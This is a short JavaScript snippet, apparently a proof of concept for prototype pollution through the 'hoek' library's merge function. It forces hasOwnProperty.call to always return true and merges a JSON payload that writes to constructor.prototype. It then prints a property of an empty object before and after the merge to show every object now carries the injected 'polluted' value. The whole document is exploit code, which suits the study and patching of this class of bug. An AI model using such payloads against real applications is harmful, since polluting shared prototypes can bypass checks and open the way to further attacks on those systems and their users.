Object.prototype.hasOwnProperty.call = () => true;
const Hoek = require('hoek');
obj = {};
let malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
Hoek.merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);